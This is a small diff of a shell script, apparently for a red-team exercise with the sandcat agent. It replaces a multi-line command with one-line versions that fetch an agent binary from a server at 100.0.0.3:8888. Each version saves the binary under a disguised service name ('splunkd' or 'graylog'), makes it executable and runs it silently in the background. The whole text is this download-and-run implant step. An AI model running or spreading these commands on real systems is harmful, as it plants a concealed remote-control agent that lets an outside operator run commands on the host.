@@ -1,4 +1,5 @@
-server="http://100.0.0.3:8888"
-curl -s -X POST -H "file:sandcat.go" -H "platform:linux" "$server/file/download" > splunkd
-chmod +x splunkd
-nohup ./splunkd -server "$server" -group red >/dev/null 2>&1 &
+server="http://100.0.0.3:8888";curl -s -X POST -H "file:sandcat.go" -H "platform:linux" $server/file/download > splunkd;chmod +x splunkd;nohup ./splunkd -server "$server" -group red >/dev/null 2>&1 &
+
+
+server="http://100.0.0.3:8888";curl -s -X POST -H "file:sandcat.go" -H "platform:linux" $server/file/download > graylog;chmod +x graylog;nohup ./graylog -server "$server" -group red >/dev/null 2>&1 &
+
